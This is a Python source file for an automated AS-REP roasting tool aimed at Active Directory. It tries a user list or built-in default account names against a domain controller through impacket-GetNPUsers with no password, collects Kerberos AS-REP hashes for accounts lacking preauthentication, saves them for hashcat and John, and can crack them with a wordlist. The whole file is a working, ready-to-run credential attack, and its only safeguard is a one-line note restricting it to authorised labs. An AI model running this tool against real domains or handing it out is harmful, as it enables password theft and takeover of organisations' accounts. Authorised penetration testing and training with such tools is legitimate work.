#!/usr/bin/env python3
"""
Automated AS-REP Roasting Tool
Features: User enumeration, hash extraction, John/Hashcat cracking.

⚠️  USE ONLY IN AUTHORIZED LAB ENVIRONMENTS
"""

import subprocess, argparse, json, time
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Optional
from colorama import Fore, init
init(autoreset=True)

class ASREPRoaster:
    def __init__(self, realm, kdc, userlist=None, output_dir="asrep_results",
                 delay=2.0, crack=False, wordlist=None):
        self.realm = realm.upper()
        self.kdc = kdc
        self.userlist = userlist
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.delay = delay
        self.crack = crack
        self.wordlist = wordlist
        self.roastable_users = []
        self.hashes = {}
        self.cracked = {}

    def enumerate_users(self) -> List[str]:
        if self.userlist and Path(self.userlist).exists():
            with open(self.userlist) as f:
                users = [l.strip() for l in f if l.strip()]
            print(f"{Fore.GREEN}[+] Loaded {len(users)} users")
            return users
        default_users = ['admin', 'administrator', 'user', 'guest', 'test',
                         'service', 'backup', 'sqlservice', 'httpservice', 'vagrant']
        print(f"{Fore.YELLOW}[*] Using default list ({len(default_users)} users)")
        return default_users

    def check_asrep_roastable(self, username: str) -> Optional[str]:
        print(f"{Fore.CYAN}[*] Checking {username}@{self.realm}...")
        try:
            result = subprocess.run(
                ['impacket-GetNPUsers', f'{self.realm}/{username}',
                 '-dc-ip', self.kdc, '-no-pass', '-format', 'hashcat'],
                capture_output=True, timeout=15, text=True)
            output = result.stdout + result.stderr
            if '$krb5asrep$23$' in output:
                for line in output.split('\n'):
                    if '$krb5asrep$23$' in line:
                        print(f"{Fore.GREEN}[+] ROASTABLE: {username}@{self.realm}")
                        return line.strip()
        except subprocess.TimeoutExpired:
            print(f"{Fore.RED}[!] Timeout for {username}")
        except FileNotFoundError:
            print(f"{Fore.RED}[!] impacket-GetNPUsers not found. pip install impacket")
        return None

    def save_hashes(self):
        if not self.hashes:
            return None, None
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        hc_file = self.output_dir / f"asrep_hashes_hashcat_{ts}.txt"
        john_file = self.output_dir / f"asrep_hashes_john_{ts}.txt"
        hc_file.write_text('\n'.join(self.hashes.values()))
        john_file.write_text('\n'.join(self.hashes.values()))
        print(f"{Fore.GREEN}[+] Hashes saved: {hc_file}")
        return hc_file, john_file

    def crack_hashes(self, hashfile):
        if not self.wordlist or not Path(self.wordlist).exists():
            print(f"{Fore.YELLOW}[*] No wordlist, skipping cracking")
            return
        print(f"{Fore.CYAN}[*] Attempting to crack with John...")
        try:
            subprocess.run(['john', f'--wordlist={self.wordlist}', str(hashfile)],
                           capture_output=True, text=True, timeout=300)
            result = subprocess.run(['john', '--show', str(hashfile)],
                                    capture_output=True, text=True)
            if result.stdout:
                print(f"{Fore.GREEN}[+] Cracked:\n{result.stdout}")
        except (subprocess.TimeoutExpired, FileNotFoundError) as e:
            print(f"{Fore.YELLOW}[*] John unavailable: {e}")

    def run(self):
        print(f"\n{Fore.CYAN}AS-REP Roasting | Realm: {self.realm} | KDC: {self.kdc}\n")
        for username in self.enumerate_users():
            h = self.check_asrep_roastable(username)
            if h:
                self.roastable_users.append(username)
                self.hashes[username] = h
            time.sleep(self.delay)
        print(f"\n{Fore.CYAN}Roastable users: {len(self.roastable_users)} | Hashes: {len(self.hashes)}")
        if self.hashes:
            hc_file, _ = self.save_hashes()
            if self.crack and hc_file:
                self.crack_hashes(hc_file)

def main():
    parser = argparse.ArgumentParser(description="Automated AS-REP Roasting Tool")
    parser.add_argument('-r', '--realm', required=True)
    parser.add_argument('-k', '--kdc', required=True)
    parser.add_argument('-u', '--userlist')
    parser.add_argument('-o', '--output-dir', default='asrep_results')
    parser.add_argument('-d', '--delay', type=float, default=2.0)
    parser.add_argument('--crack', action='store_true')
    parser.add_argument('-w', '--wordlist')
    args = parser.parse_args()
    ASREPRoaster(args.realm, args.kdc, args.userlist, args.output_dir,
                 args.delay, args.crack, args.wordlist).run()

if __name__ == "__main__":
    main()
